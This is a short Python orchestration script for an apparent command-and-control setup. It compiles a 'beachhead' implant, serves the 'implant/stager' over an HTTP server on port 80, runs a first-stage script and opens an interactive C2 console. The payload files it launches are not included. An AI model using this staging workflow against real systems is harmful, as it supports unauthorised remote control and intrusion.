import subprocess
import sys
import time

# CONFIGURATION
HTTP_SERVER_PORT = 80
FIRST_STAGE_SCRIPT = 'first_stage.py'
BEACHHEAD_DIR = 'beachhead'

# Compile beachhead
print(f"Compiling {BEACHHEAD_DIR}...")
try:
    subprocess.run(['make'], cwd=BEACHHEAD_DIR, check=True)
    print(f"{BEACHHEAD_DIR} compiled successfully")
except subprocess.CalledProcessError as e:
    print(f"Error compiling {BEACHHEAD_DIR}: {e}")
    sys.exit(1)
except FileNotFoundError:
    print(f"Error: 'make' command not found")
    sys.exit(1)

time.sleep(1)

# Start the HTTP server
print(f"Starting HTTP server on port {HTTP_SERVER_PORT}...")
try:
    http_server = subprocess.Popen([sys.executable, '-m', 'http.server', str(HTTP_SERVER_PORT)])
    print(f"HTTP server started (PID: {http_server.pid})")
except Exception as e:
    print(f"Error starting HTTP server: {e}")
    sys.exit(1)

time.sleep(1)

# Run first stage script
print(f"Running {FIRST_STAGE_SCRIPT}...")
try:
    first_stage = subprocess.run([sys.executable, FIRST_STAGE_SCRIPT], check=True)
    print(f"{FIRST_STAGE_SCRIPT} completed successfully")
except subprocess.CalledProcessError as e:
    print(f"Error running {FIRST_STAGE_SCRIPT}: {e}")
    http_server.terminate()
    sys.exit(1)
except FileNotFoundError:
    print(f"Error: Could not find '{FIRST_STAGE_SCRIPT}'")
    http_server.terminate()
    sys.exit(1)

# Run C2 client (server.py)
print("\n--- Starting C2 interface ---")
print(f"  • HTTP server (implant/stager): port {HTTP_SERVER_PORT}")
print("\nYou can now type commands below:\n")

try:
    subprocess.run([sys.executable, 'server.py'], check=True)
except KeyboardInterrupt:
    pass
except FileNotFoundError:
    print(f"Error: Could not find 'server.py'")
except subprocess.CalledProcessError as e:
    print(f"Error running server.py: {e}")

print("\nShutting down...")
http_server.terminate()
print("Clean exit.")